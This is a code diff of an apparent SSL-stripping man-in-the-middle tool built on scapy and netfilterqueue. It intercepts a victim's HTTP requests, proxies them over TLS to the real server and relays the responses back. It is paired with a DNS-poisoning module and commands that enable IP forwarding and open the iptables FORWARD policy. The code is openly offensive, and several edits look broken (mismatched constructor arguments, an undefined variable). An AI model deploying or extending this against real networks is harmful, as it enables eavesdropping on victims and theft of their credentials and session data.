@@ -2,14 +2,47 @@ from scapy.all import *
 from netfilterqueue import NetfilterQueue
 from scapy.layers.http import *
 from scapy.layers.tls import *
+from collections import deque
 import os
 import threading
+import multiprocessing
 import time
 
 import dns_poisoning
 
 load_layer("tls")    
 load_layer("http")    
+
+class PausableAutomaton(multiprocessing.Process):
+
+    def __init__(self, host, ip_victim):
+
+        multiprocessing.Process.__init__(self)
+        self.automaton = TLSClientAutomaton.tlslink(HTTP, server=host, dport=443)
+        self.ip_victim = ip_victim
+
+        self.exit = multiprocessing.Event()
+
+    def run(self):
+
+        self.exit.clear()
+
+        while not self.exit.is_set():
+
+            packet = self.automaton.recv()
+
+            if packet:
+                send(IP(dst = self.ip_victim) / TCP() / packet)
+
+    def send(self, packet):
+
+        self.stop()
+        self.automaton.send(HTTP(clsreq = packet))
+        self.run()
+
+    def stop(self):
+
+        self.exit.set()
 
 class SslRemover():
 
@@ -33,6 +66,10 @@ class SslRemover():
         if packet_scapy.haslayer(HTTPRequest):
             self.handle_request(packet_scapy[HTTPRequest])
 
+    def add_automaton(self, host):
+
+        self.tls_automata[host] = PausableAutomaton(HTTP, server=host, dport=443)
+
     def get_automaton(self, host):
 
         try:
@@ -41,19 +78,16 @@ class SslRemover():
         except KeyError as _:
             return None
 
-    def handle_request(self, packet_scapy):
+    def handle_request(self, packet):
 
-        tls_automaton = self.get_automaton(packet_scapy.Host)
+        tls_automaton = self.get_automaton(packet.Host)
 
         if tls_automaton:
-            tls_automaton.send(HTTP(clsreq = packet_scapy))
+            tls_automaton.send(clsreq = packet)
 
         else:
-            self.add_automaton(packet_scapy.Host)
-
-    def add_automaton(self, host):
-
-        self.tls_automata[host] = TLSClientAutomaton.tls_link(HTTP, server=host, dport=443)
+            self.add_automaton(packet.Host)
+            self.tls_automata[host].send(packet)
 
 #    def stripped_victim_automation(self):
 #        #socket = TCP_client.tcpautomaton(HTTP, <>, 80)
@@ -139,7 +173,7 @@ class SslRemover():
     def start(self):
 
         os.system(self.iprule_add)    #make sure SSL ssling
-        os.system(self.iprule2_add)    #make sure SSL ssling
+#        os.system(self.iprule2_add)    #make sure SSL ssling
         self.thread.start()    #queue starts accepting packages
 
         print "SSL stripping started"
@@ -147,7 +181,7 @@ class SslRemover():
     def stop(self):
 
         os.system(self.iprule_remove)    #make sure SSL nbot ssling
-        os.system(self.iprule2_remove)    #make sure SSL nbot ssling
+#        os.system(self.iprule2_remove)    #make sure SSL nbot ssling
         self.queue.unbind()    #delete queue
 
         print "SSL stripping stopped"
@@ -170,5 +204,9 @@ def test():
     thread.run()
 
 if __name__ == "__main__":
+
+    import os
+    os.system("sysctl -w net.ipv4.ip_forward=1")
+    os.system("iptables -P FORWARD ACCEPT")
 
     test()
